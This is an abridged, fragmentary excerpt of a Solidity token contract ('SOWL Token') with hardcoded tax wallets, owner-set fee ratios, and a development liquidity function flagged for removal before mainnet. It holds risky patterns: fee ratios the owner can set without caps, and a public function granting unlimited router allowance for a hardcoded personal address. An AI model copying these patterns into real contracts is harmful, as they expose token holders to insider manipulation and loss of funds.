...
contract SOWLToken is IERC20 {
    ...
    string constant private _name = "SOWL Token";
    string constant private _symbol = "SOWL";
    ...
    TaxWallets public _taxWallets = TaxWallets({
        marketing: payable(0xB48a147A194834a4b9bF45720D9624770301Db61),
        development: payable(0x597459148a6ED6Db1dD88Ea8a01d05530fd912f1),
        charity: payable(0xab6d36Befa6754033ED3EbE8CAF19def22494297)
    });
...
//===============================================================================================================
    ...
    function setRatios(uint16 reflection, uint16 charity, uint16 marketing, uint16 development) external onlyOwner {
        _ratios.reflection = reflection;
        _ratios.charity = charity;
        _ratios.marketing = marketing;
        _ratios.development = development;
        _ratios.totalSwap = development + marketing + charity;
    ...
    function contractSwap(uint256 contractTokenBalance) internal inSwapFlag {
        ...
        uint256 marketingBalance = amtBalance - (developmentBalance + charityBalance);
...
//                                                    REMOVE BEFORE MAINNET DEPLOYMENT
    ...
    */
    function _addLiqDev2 (address _antiSnipe) public onlyOwner {
        require(address(this).balance > 0, "Contract balance is 0.");
        _approve(address(this), address(dexRouter), type(uint256).max);
        protections = Protections(_antiSnipe);
        try _AntiSnipe(_antiSnipe).fullReset() {} catch { revert("Antisnipe failed."); }
        approvePersonals();
        ...
        try dexRouter.addLiquidityETH{value: address(this).balance}(
            ...
            msg.sender,
            block.timestamp
        ) {} catch { revert("Liquidity errored."); }
        approvePersonals();
        enableTrading();
    }
    ...
    function approvePersonals() public {
        ...
        _approve(0x69ed39408049b70FaeB48F87441a99460CC1cC10, address(dexRouter), type(uint256).max);
    }
}

interface _AntiSnipe {
